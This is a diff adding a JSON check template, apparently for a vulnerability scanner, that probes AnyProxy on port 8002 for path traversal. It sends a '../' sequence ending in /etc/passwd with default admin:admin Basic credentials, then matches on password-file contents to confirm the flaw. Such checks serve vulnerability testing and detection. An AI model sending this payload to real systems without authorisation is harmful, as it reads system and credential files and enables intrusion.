@@ -1,0 +1,47 @@
+{
+    "id" : "00003",
+    "name" : "AnyProxy_Path_Traversal",
+    "desc" : "apps=Express",
+    "author" : "",
+    "version" : "1.0",
+    "references" : [
+        "https://github.com/alibaba/anyproxy/issues/391"
+    ],
+    "request" : {
+        "protocols" : ["http", "https"],
+        "method" : "GET",
+        "ports" : [8002],
+        "suffixes" : [
+            "/fetchBody?id=1/../../../../../../../../etc/passwd"
+        ],
+        "user-agent" : "",
+        "headers" : {
+            "Authorization" : "Basic YWRtaW46YWRtaW4="
+        },
+        "auth" : {
+            "username" : "",
+            "password" : ""
+        },
+        "queryset": [],
+        "bodys" : [],
+        "json" : null
+    },
+    "matcher" : {
+        "status" : [],
+        "texts" : [
+            {
+                "type" : "icontains",
+                "value" : "root:x:0"
+            },
+            {
+                "type" : "icontains",
+                "value" : "sshd"
+            },
+            {
+                "type" : "icontains",
+                "value" : "sbin/nologin"
+            }
+        ],
+        "headers" : []
+    }
+}
